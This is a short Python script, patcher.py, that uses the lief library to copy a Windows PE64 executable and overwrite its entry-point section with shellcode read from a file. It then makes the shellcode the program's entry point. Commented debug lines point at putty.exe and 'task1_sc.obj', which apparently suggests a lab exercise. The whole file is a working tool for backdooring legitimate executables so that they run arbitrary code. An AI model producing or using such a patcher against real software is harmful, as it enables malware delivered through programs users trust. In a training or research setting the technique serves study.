import sys
import argparse
import shutil
import lief


def parse_cli_args():
    parser = argparse.ArgumentParser(description = "patcher.py patches PE64 file with shellcode.")
    parser.add_argument("-e", "--exe", required = True, type = str, default = "", help = "Executable PE64 file basename (.exe)")
    parser.add_argument("-s", "--sc", required = True, type = str, default = "", help = "Shellcode file basename (.bin / .obj)")
    args = parser.parse_args()
    return args


def read_file(filename, mode):
    with open(filename, mode) as file:
        content = file.read()
        return content


def byte2hex(bytestr):
    hexstr = ""
    for b in bytestr:
        hexstr += f"\\x{b:02x}"
    return hexstr


def hex2byte(hexstr):
    bytestr = hexstr.replace("\\x", "")
    bytestr = bytes.fromhex(bytestr)
    return bytestr


def patch(file_patched, sc):
    pe = lief.parse(file_patched)
    text = pe.section_from_rva(pe.optional_header.addressof_entrypoint)
    if text.size < len(sc):
        raise Exception(f"[-] Shellcode is too long")

    text.content = list(sc.ljust(text.size, b"\xcc"))
    pe.optional_header.addressof_entrypoint = text.virtual_address
    out = lief.PE.Builder(pe)
    out.build()
    out.write(file_patched)
    print(f"[+] File {file_patched} was patched")


def main():
    args = parse_cli_args()
    file_exe = args.exe
    file_sc = args.sc
    file_patched = f"patched.exe"

    shutil.copy(file_exe, file_patched)

    sc = read_file(file_sc, "rb")
    print(byte2hex(sc))
    print(f"[!] Shellcode size: {len(sc)}")

    patch(file_patched, sc)


if __name__ == "__main__":
    # # Simulation of CLI arguments. For debug only
    # exe = "putty.exe"
    # sc = "task1_sc.obj"
    #
    # sys.argv = ["patcher.py"]
    # sys.argv = ["patcher.py", "--exe", exe, "--sc", sc]
    main()
